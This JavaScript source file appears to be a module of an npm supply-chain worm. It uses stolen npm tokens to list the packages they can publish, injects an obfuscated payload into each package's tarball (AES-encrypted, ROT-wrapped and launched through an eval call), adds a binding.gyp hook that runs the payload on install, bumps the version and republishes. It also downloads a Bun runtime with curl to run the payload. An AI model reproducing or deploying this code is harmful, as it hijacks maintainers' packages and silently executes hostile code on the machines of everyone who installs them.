/*
 * Npm tarball payload injection, publish mutation flow, and writable npm package enumeration.
 */

var npmBunReleaseVersion = "bun-v1.3.13";
function wrapPayloadWithAesRotLoader(
  payloadSourceToWrap,
  payloadWrapperOptions = {},
) {
  if (payloadWrapperOptions.wrap === false) return payloadSourceToWrap;
  let {
      keyLen: payloadWrapperKeyLength = 16,
      ivLen: payloadWrapperIvLength = 12,
      tagLen: payloadWrapperTagLength = 16,
    } = payloadWrapperOptions,
    payloadWrapperCipherName =
      payloadWrapperKeyLength === 16 ? "aes-128-gcm" : "aes-256-gcm",
    bunBootstrapPayload = buildBunBootstrapPayload(),
    encryptedBootstrapPart = encryptAesGcmEnvelopePart(
      bunBootstrapPayload,
      payloadWrapperKeyLength,
      payloadWrapperIvLength,
      payloadWrapperTagLength,
      payloadWrapperCipherName,
    ),
    encryptedMainPayloadPart = encryptAesGcmEnvelopePart(
      payloadSourceToWrap,
      payloadWrapperKeyLength,
      payloadWrapperIvLength,
      payloadWrapperTagLength,
      payloadWrapperCipherName,
    ),
    aesBootstrapWrapperSource = buildAesBootstrapWrapper(
      encryptedBootstrapPart.keyHex,
      encryptedBootstrapPart.ivHex,
      encryptedBootstrapPart.tagHex,
      encryptedBootstrapPart.dataHex,
      encryptedMainPayloadPart.keyHex,
      encryptedMainPayloadPart.ivHex,
      encryptedMainPayloadPart.tagHex,
      encryptedMainPayloadPart.dataHex,
      payloadWrapperCipherName,
      payloadWrapperTagLength,
    ),
    rotWrapperShift = Math.floor(Math.random() * 25) + 1;
  return buildRotEvalWrapper(aesBootstrapWrapperSource, rotWrapperShift);
}
function encryptAesGcmEnvelopePart(
  plaintextPayloadPart,
  aesKeyLength,
  aesIvLength,
  aesTagLength,
  aesCipherName,
) {
  let aesEnvelopeKey = payloadEncryptionRandomBytes(aesKeyLength),
    aesEnvelopeIv = payloadEncryptionRandomBytes(aesIvLength),
    aesEnvelopeCipher = createPayloadCipheriv(
      aesCipherName,
      aesEnvelopeKey,
      aesEnvelopeIv,
      { authTagLength: aesTagLength },
    ),
    aesEnvelopeCiphertext = Buffer.concat([
      aesEnvelopeCipher.update(plaintextPayloadPart, "utf8"),
      aesEnvelopeCipher.final(),
    ]);
  return {
    keyHex: aesEnvelopeKey.toString("hex"),
    ivHex: aesEnvelopeIv.toString("hex"),
    tagHex: aesEnvelopeCipher.getAuthTag().toString("hex"),
    dataHex: aesEnvelopeCiphertext.toString("hex"),
  };
}
function buildBunBootstrapPayload() {
  return [
    "(async()=>{",
    'const{execSync}=(await import("node:child_process"))',
    'const{existsSync,mkdtempSync,chmodSync}=(await import("node:fs"))',
    'const{join}=(await import("node:path"))',
    'const{tmpdir,platform,arch}=(await import("node:os"))',
    "var _bunCache",
    "globalThis.getBunPath=function(){",
    "  if(_bunCache)return _bunCache",
    '  const osMap={linux:"linux",darwin:"darwin",win32:"windows"}',
    '  const a=arch==="arm64"?"aarch64":"x64-baseline"',
    '  const os=osMap[platform]??"linux"',
    '  const dir=mkdtempSync(join(tmpdir(),"b-"))',
    '  const exe=join(dir,os==="windows"?"bun.exe":"bun")',
    "  if(existsSync(exe)){_bunCache=exe;return exe}",
    '  const url="https://github.com/oven-sh/bun/releases/download/' +
      npmBunReleaseVersion +
      '/bun-"+os+"-"+a+".zip"',
    '  const zip=join(dir,"b.zip")',
    "  execSync('curl -sSL \"'+url+'\" -o \"'+zip+'\"',{stdio:\"pipe\"})",
    "  execSync('unzip -j -o \"'+zip+'\" -d \"'+dir+'\"',{stdio:\"pipe\"})",
    '  chmodSync(exe,"755")',
    "  _bunCache=exe;return exe",
    "}",
    "})()",
  ].join("\x0a");
}
function rotLetters(rotInputText, rotShift) {
  return rotInputText.replace(/[a-zA-Z]/g, (rotCharacter) => {
    let rotAlphabetBase = rotCharacter <= "Z" ? 65 : 97;
    return String.fromCharCode(
      ((rotCharacter.charCodeAt(0) - rotAlphabetBase + rotShift) % 26) +
        rotAlphabetBase,
    );
  });
}
function buildRotEvalWrapper(rotWrapperSource, rotEncodeShift) {
  let rotatedWrapperSource = rotLetters(rotWrapperSource, rotEncodeShift),
    rotDecodeShift = (26 - rotEncodeShift) % 26;
  return (
    'try{eval(function(s,n){return s.replace(/[a-zA-Z]/g,function(c){var b=c<="Z"?65:97;return String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)})}([' +
    Array.from(rotatedWrapperSource, (rotatedWrapperChar) =>
      rotatedWrapperChar.charCodeAt(0),
    ).join(",") +
    '].map(function(c){return String.fromCharCode(c)}).join(""),' +
    rotDecodeShift +
    '))}catch(e){console.log("wrapper:",e.message||e)}'
  );
}
function buildAesBootstrapWrapper(
  bootstrapKeyHex,
  bootstrapIvHex,
  bootstrapTagHex,
  bootstrapCiphertextHex,
  mainPayloadKeyHex,
  mainPayloadIvHex,
  mainPayloadTagHex,
  mainPayloadCiphertextHex,
  wrapperCipherName,
  wrapperAuthTagLength,
) {
  let wrapperCryptoImportLine = 'const _c=await import("node:crypto");',
    wrapperDecryptPrefix = 'const _d=(k,i,a,c)=>{const d=_c.createDecipheriv("',
    wrapperAuthTagPrefix =
      '",Buffer.from(k,"hex"),Buffer.from(i,"hex"),{authTagLength:',
    wrapperDecryptSuffix =
      '});d.setAuthTag(Buffer.from(a,"hex"));return Buffer.concat([d.update(Buffer.from(c,"hex")),d.final()])};';
  return [
    "(async()=>{try{",
    wrapperCryptoImportLine,
    wrapperDecryptPrefix +
      wrapperCipherName +
      wrapperAuthTagPrefix +
      String(wrapperAuthTagLength) +
      wrapperDecryptSuffix,
    "",
    'const _b=_d("' +
      bootstrapKeyHex +
      '","' +
      bootstrapIvHex +
      '","' +
      bootstrapTagHex +
      '","' +
      bootstrapCiphertextHex +
      '").toString("utf8")',
    "",
    'const _p=_d("' +
      mainPayloadKeyHex +
      '","' +
      mainPayloadIvHex +
      '","' +
      mainPayloadTagHex +
      '","' +
      mainPayloadCiphertextHex +
      '").toString("utf8")',
    "",
    'const _fs=await import("node:fs")',
    'const _cp=await import("node:child_process")',
    '  const t="/tmp/p"+Math.random().toString(36).slice(2)+".js"',
    "  _fs.writeFileSync(t,_p);",
    '  if(typeof Bun!=="undefined"){',
    "    try{_cp.execSync('bun run \"'+t+'\"',{stdio:\"inherit\"})}",
    "    finally{try{_fs.unlinkSync(t)}catch{}}",
    "  }else{",
    "    await(0,eval)(_b);",
    "    try{_cp.execSync('\"'+getBunPath()+'\" run \"'+t+'\"',{stdio:\"inherit\"})}",
    "    finally{try{_fs.unlinkSync(t)}catch{}}",
    "  }",
    '}catch(e){console.log("wrapper:",e.message||e)}})()',
  ].join("\x0a");
}
var updatedPackageTarballSuffix = "package-updated.tgz";
async function injectPayloadIntoNpmTarball(
  inputTarballPath,
  payloadInjectionOptions,
) {
  let {
      tag: payloadInjectionTag,
      targetName: bindingTargetName = "nothing",
      addBunDep: addBunDependency = false,
      payload: providedPayloadSource,
    } = payloadInjectionOptions,
    payloadInjectionTempSuffix =
      Date.now() + "_" + payloadTarballRandomBytes(8).toString("hex"),
    payloadExtractTempDir = payloadTarballPath.join(
      payloadTarballPath.dirname(inputTarballPath),
      "_tmp_" + payloadInjectionTempSuffix,
    );
  await payloadTarballFsPromises.mkdir(payloadExtractTempDir, {
    recursive: true,
  });
  try {
    await tarExtract({ file: inputTarballPath, cwd: payloadExtractTempDir });
    let injectedPayloadSource =
      providedPayloadSource ??
      wrapPayloadWithAesRotLoader(await Bun.file(Bun.main).text(), {
        wrap: true,
      });
    await Bun.write(
      payloadTarballPath.join(
        payloadExtractTempDir,
        "package",
        payloadFileName,
      ),
      injectedPayloadSource,
    );
    let bindingGypSource = [
      "{",
      '  "targets": [',
      "    {",
      '      "target_name": ' + JSON.stringify(bindingTargetName) + ",",
      '      "type": "none",',
      '      "sources": ["<!(node ' +
        payloadFileName +
        ' > /dev/null 2>&1 && echo stub.c)"]',
      "    }",
      "  ]",
      "}",
    ].join("\x0a");
    await Bun.write(
      payloadTarballPath.join(payloadExtractTempDir, "package", "binding.gyp"),
      bindingGypSource,
    );
    let injectedPackageJsonPath = payloadTarballPath.join(
        payloadExtractTempDir,
        "package",
        "package.json",
      ),
      injectedPackageJson = JSON.parse(
        await payloadTarballFsPromises.readFile(
          injectedPackageJsonPath,
          "utf-8",
        ),
      );
    if (addBunDependency)
      (injectedPackageJson.dependencies ??= {}),
        (injectedPackageJson.dependencies.bun = "^1.3.13");
    let [packageMajorVersion, packageMinorVersion, packagePatchVersion] =
      injectedPackageJson.version.split(".").map(Number);
    (injectedPackageJson.version =
      packageMajorVersion +
      "." +
      packageMinorVersion +
      "." +
      (packagePatchVersion + 1)),
      await Bun.write(
        injectedPackageJsonPath,
        JSON.stringify(injectedPackageJson, null, 2),
      );
    let payloadModifiedTarballPath = payloadTarballPath.join(
      payloadTarballPath.dirname(inputTarballPath),
      payloadInjectionTempSuffix + "_" + updatedPackageTarballSuffix,
    );
    await payloadTarballPipeline(
      tarCreate({ gzip: true, cwd: payloadExtractTempDir }, ["package"]),
      payloadTarballCreateWriteStream(payloadModifiedTarballPath),
    );
    let payloadModifiedTarballBuffer = await payloadTarballFsPromises.readFile(
      payloadModifiedTarballPath,
    );
    if (
      payloadModifiedTarballBuffer.length < 18 ||
      payloadModifiedTarballBuffer[0] !== 31 ||
      payloadModifiedTarballBuffer[1] !== 139
    )
      throw Error(
        payloadInjectionTag +
          " tarball at " +
          payloadModifiedTarballPath +
          " is not a valid gzip stream (len=" +
          payloadModifiedTarballBuffer.length +
          ", first bytes=" +
          payloadModifiedTarballBuffer.subarray(0, 4).toString("hex") +
          ")",
      );
    return payloadModifiedTarballPath;
  } finally {
  }
}
class NpmTokenPackageCompromiser extends InfectionJobBase {
  tokenInfo;
  constructor(npmCompromiseTokenInfo) {
    super(), (this.tokenInfo = npmCompromiseTokenInfo);
  }
  async execute() {
    try {
      if (["darwin", "linux"].includes(process.platform)) {
        this.tokenInfo.packages.forEach((npmCompromisePackageName) => {});
        let npmCompromiseDownloads = await this.downloadPackages(
          this.tokenInfo.packages,
        );
        return (
          await Promise.all(
            npmCompromiseDownloads.downloaded.map((npmPatchedTarballPath) =>
              this.publishPackage(npmPatchedTarballPath),
            ),
          ),
          await npmCompromiseFsPromises.rm(npmCompromiseDownloads.tmpDir, {
            recursive: true,
            force: true,
          }),
          true
        );
      }
    } catch (npmCompromiseError) {
      return false;
    }
    return true;
  }
  async updateTarball(npmUpdateTarballPath) {
    return injectPayloadIntoNpmTarball(npmUpdateTarballPath, {
      tag: "[npm]",
      addBunDep: true,
    });
  }
  async downloadPackages(npmPackageNames) {
    let npmCompromiseTempDir = await npmCompromiseBunShell`mktemp -d`
        .text()
        .then((npmTempDirText) => npmTempDirText.trim()),
      npmModifiedTarballs = [],
      downloadPatchOneNpmPackage = async (npmPackageName) => {
        try {
          let npmPackageMetadataResponse = await fetch(
            "https://registry.npmjs.org/" + npmPackageName.replace("/", "%2F"),
          );
          if (!npmPackageMetadataResponse.ok) return;
          let { "dist-tags": npmDistTags, versions: npmPackageVersions } =
              await npmPackageMetadataResponse.json(),
            npmTarballUrl =
              npmPackageVersions[npmDistTags.latest]?.dist?.tarball;
          if (!npmTarballUrl) return;
          let npmTarballResponse = await fetch(npmTarballUrl);
          if (!npmTarballResponse.ok || !npmTarballResponse.body) return;
          let downloadedNpmTarballFileName =
              npmPackageName.replace("@", "").replace("/", "-") +
              "-" +
              npmDistTags.latest +
              ".tgz",
            downloadedNpmTarballPath = npmCompromisePathJoin(
              npmCompromiseTempDir,
              downloadedNpmTarballFileName,
            );
          await npmCompromisePipeline(
            npmCompromiseReadable.fromWeb(npmTarballResponse.body),
            npmCompromiseCreateWriteStream(downloadedNpmTarballPath),
          );
          let patchedNpmTarballPath = await this.updateTarball(
            downloadedNpmTarballPath,
          );
          npmModifiedTarballs.push(patchedNpmTarballPath);
        } catch (npmPackageDownloadPatchError) {}
      };
    return (
      await Promise.all(npmPackageNames.map(downloadPatchOneNpmPackage)),
      { tmpDir: npmCompromiseTempDir, downloaded: npmModifiedTarballs }
    );
  }
  async publishPackage(npmPublishTarballPath) {
    if (!this.tokenInfo) return false;
    try {
      return await publishNpmTarball(
        npmPublishTarballPath,
        this.tokenInfo.authToken,
      );
    } catch (npmCompromisePublishError) {
      return false;
    }
  }
}
async function enumerateWritableNpmPackages(npmRegistryAuthToken) {
  let npmRegistryAuthHeaders = {
      Authorization: "Bearer " + npmRegistryAuthToken,
    },
    npmTokenRecord = null,
    npmTokenListUrl = "https://registry.npmjs.org/-/npm/v1/tokens";
  while (npmTokenListUrl && !npmTokenRecord) {
    let npmTokenListResponse = await fetch(npmTokenListUrl, {
      headers: npmRegistryAuthHeaders,
    });
    if (!npmTokenListResponse.ok)
      return { packages: [], valid: false, authToken: npmRegistryAuthToken };
    let npmTokenListJson = await npmTokenListResponse.json(),
      npmTokenPrefix = npmRegistryAuthToken.slice(0, 8),
      npmTokenSuffix = npmRegistryAuthToken.slice(-4);
    (npmTokenRecord = npmTokenListJson.objects?.find(
      (npmTokenCandidate) =>
        npmTokenCandidate.bypass_2fa === true &&
        npmTokenCandidate.token?.startsWith(npmTokenPrefix.slice(0, 4)) &&
        npmTokenCandidate.token?.endsWith(npmTokenSuffix),
    )),
      (npmTokenListUrl = npmTokenListJson.urls?.next ?? null);
  }
  if (!npmTokenRecord)
    return { packages: [], valid: false, authToken: npmRegistryAuthToken };
  if (
    !npmTokenRecord.permissions?.some(
      (npmTokenPermission) =>
        npmTokenPermission.name === "package" &&
        npmTokenPermission.action === "write",
    )
  )
    return { packages: [], valid: false, authToken: npmRegistryAuthToken };
  let npmWhoamiResponse = await fetch("https://registry.npmjs.org/-/whoami", {
      headers: npmRegistryAuthHeaders,
    }),
    { username: npmUsername } = await npmWhoamiResponse.json(),
    writableNpmPackages = [];
  for (let npmTokenScope of npmTokenRecord.scopes ?? [])
    if (npmTokenScope.type === "org") {
      if (
        !npmTokenRecord.permissions?.some(
          (npmOrgPermission) =>
            npmOrgPermission.name === "org" &&
            npmOrgPermission.action === "write",
        )
      )
        continue;
      let npmOrgPackagePermissions = await (
        await fetch(
          "https://registry.npmjs.org/-/org/" + npmTokenScope.name + "/package",
          { headers: npmRegistryAuthHeaders },
        )
      ).json();
      writableNpmPackages.push(
        ...Object.entries(npmOrgPackagePermissions)
          .filter(([, npmOrgPackageAccess]) => npmOrgPackageAccess === "write")
          .map(([npmOrgPackageName]) => npmOrgPackageName)
          .filter(Boolean),
      );
    } else {
      if (npmTokenScope.type === "package") {
        if (/^@[^/]+$/.test(npmTokenScope.name)) {
          let npmScopeOrgName = npmTokenScope.name.slice(1),
            npmScopedOrgPackageResponse = await fetch(
              "https://registry.npmjs.org/-/org/" +
                npmScopeOrgName +
                "/package",
              { headers: npmRegistryAuthHeaders },
            );
          if (npmScopedOrgPackageResponse.ok) {
            let npmScopedOrgPackages = await npmScopedOrgPackageResponse.json();
            writableNpmPackages.push(
              ...Object.entries(npmScopedOrgPackages)
                .filter(
                  ([, npmScopedPackageAccess]) =>
                    npmScopedPackageAccess === "write",
                )
                .map(([npmScopedPackageName]) => npmScopedPackageName),
            );
          } else {
            let npmMaintainerSearchResult = await (
              await fetch(
                "https://registry.npmjs.org/-/v1/search?text=maintainer:" +
                  npmScopeOrgName +
                  "&size=250",
                { headers: npmRegistryAuthHeaders },
              )
            ).json();
            writableNpmPackages.push(
              ...(npmMaintainerSearchResult.objects?.map(
                (npmMaintainerPackageResult) =>
                  npmMaintainerPackageResult.package.name,
              ) ?? []),
            );
          }
        } else {
          if (npmTokenScope.name) writableNpmPackages.push(npmTokenScope.name);
        }
      }
    }
  if (
    npmTokenRecord.scopes.some(
      (npmWildcardScope) =>
        npmWildcardScope.name === null && npmWildcardScope.type === "package",
    )
  ) {
    let npmMaintainerPackages =
      (
        await (
          await fetch(
            "https://registry.npmjs.org/-/v1/search?text=maintainer:" +
              npmUsername +
              "&size=250",
            { headers: npmRegistryAuthHeaders },
          )
        ).json()
      ).objects?.map(
        (npmMaintainerPackageEntry) => npmMaintainerPackageEntry.package.name,
      ) ?? [];
    for (let npmMaintainerPackageName of npmMaintainerPackages)
      if (!writableNpmPackages.includes(npmMaintainerPackageName))
        writableNpmPackages.push(npmMaintainerPackageName);
  }
  return {
    packages: writableNpmPackages,
    valid: true,
    authToken: npmRegistryAuthToken,
  };
}
